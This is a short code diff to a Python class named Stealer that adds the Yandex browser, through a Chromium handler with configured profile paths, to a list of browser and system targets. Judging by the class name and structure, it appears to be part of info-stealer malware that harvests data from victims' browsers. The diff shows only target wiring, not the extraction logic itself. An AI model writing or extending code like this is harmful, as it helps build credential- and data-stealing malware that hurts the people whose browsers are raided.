@@ -109,6 +109,16 @@ class Stealer(Thread):
                 "status": browser_statuses
             },
             {
+                "object": Chromium(
+                    Browsers.YANDEX.value,
+                    self.__config.StoragePath,
+                    self.__config.YandexPaths[0],
+                    self.__config.YandexPaths[1],
+                    browser_functions
+                ),
+                "status": browser_statuses
+            },
+            {
                 "object": System(
                     self.__config.StoragePath,
                     "System"
